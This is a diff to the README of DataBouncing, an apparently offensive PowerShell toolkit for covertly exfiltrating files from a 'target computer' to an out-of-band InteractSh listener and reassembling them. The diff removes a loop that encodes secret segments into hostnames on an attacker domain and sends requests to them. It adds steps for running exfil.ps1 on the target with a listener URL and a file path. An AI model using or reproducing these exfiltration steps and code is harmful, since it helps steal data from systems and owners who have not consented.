@@ -26,22 +26,17 @@ Processes data received from `exfil.ps1`, finding patterns in logs, assembling d
    Start the InteractSh Client on your listener machine:
 
 2. **Target Machine Preparation**:
-Convert a file to hex for transfer using [Convert-FileToHexChunks.ps1](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1).
+   Prepare your data to be exfiltrated. 
+   Run this [exfil.ps1](https://github.com/Unit-259/DataBouncing/blob/main/Client/exfil.ps1) script on the target computer.
+
 
 ### Running the Scripts
 1. **Data Exfiltration with `exfil.ps1`**:
+      - provide url for OOB Lister
+      - provide filepath of target exfil data
 
 2. **Data Reconstruction with `recreate.ps1`**:
-
-## Additional Functions
-- `Demo-Secrets` for testing exfiltration:
-
-  foreach ($segment in $segments.PSObject.Properties) {
-      $secret = $segment.Value
-      $url = "$xregex.$secret.$urlSuffix"
-      Send-CustomRequest $url
-  }
-
+      - provide regex key
 
 ## Notes
 - Remember to replace placeholders like 'your-regex', 'your-domain.oast.online', etc., with actual values relevant to your setup.
